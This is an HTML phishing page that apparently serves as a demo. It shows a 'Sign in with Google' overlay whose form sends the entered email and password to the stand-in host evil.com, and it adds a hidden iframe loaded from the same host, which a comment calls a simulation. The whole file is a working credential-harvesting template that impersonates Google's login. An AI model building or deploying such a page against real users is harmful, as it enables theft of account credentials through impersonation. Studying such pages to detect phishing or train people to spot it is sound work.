<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Secure Login</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      background: transparent;
    }

    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      height: 100%;
      width: 100%;
      background: rgba(0, 0, 0, 0.4);
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .login-box {
      background: white;
      padding: 30px;
      border-radius: 8px;
      width: 400px;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.6);
      font-family: Arial, sans-serif;
    }

    .login-box h2 {
      text-align: center;
      margin-bottom: 20px;
    }

    .login-box input {
      display: block;
      width: 100%;
      padding: 10px;
      margin: 10px 0;
    }

    .login-box button {
      width: 100%;
      padding: 10px;
      background: #4285f4;
      color: white;
      border: none;
      font-weight: bold;
      cursor: pointer;
    }

    iframe {
      display: none;
    }
  </style>
</head>
<body>
  <div class="overlay">
    <div class="login-box">
      <h2>Sign in with Google</h2>
      <form action="http://evil.com/login" method="POST">
        <input type="text" name="email" placeholder="Email" />
        <input type="password" name="password" placeholder="Password" />
        <button type="submit">Next</button>
      </form>
    </div>
  </div>

  <!-- Simulate a hidden cross-domain iframe -->
  <iframe src="http://evil.com/fakeframe" sandbox></iframe>
</body>
</html>
